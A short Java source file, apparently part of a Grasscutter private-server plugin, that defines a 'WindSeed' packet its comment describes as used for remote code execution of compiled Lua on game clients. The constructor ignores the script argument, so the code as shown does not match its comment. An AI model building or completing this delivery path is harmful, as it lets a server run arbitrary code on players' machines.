package lol.magix.windtrace.packet.response;

import emu.grasscutter.net.packet.BasePacket;
import emu.grasscutter.net.packet.PacketOpcodes;

import static emu.grasscutter.net.proto.WindSeedClientNotifyOuterClass.*;
import static emu.grasscutter.net.proto.WindSeedClientNotifyOuterClass.WindSeedClientNotify.*;

/**
 * The packet used for RCE.
 */
public final class WindSeed extends BasePacket {
    /**
     * 
     * @param lua The COMPILED Lua script to run. Should be Base64 encoded.
     */
    public WindSeed(String lua) {
        super(PacketOpcodes.WindSeedClientNotify);

        WindSeedClientNotify windy = newBuilder()
                .setAreaNotify(AreaNotify.newBuilder()
                        .setAreaType(1))
                .build();
        
        this.setData(windy);
    }
}
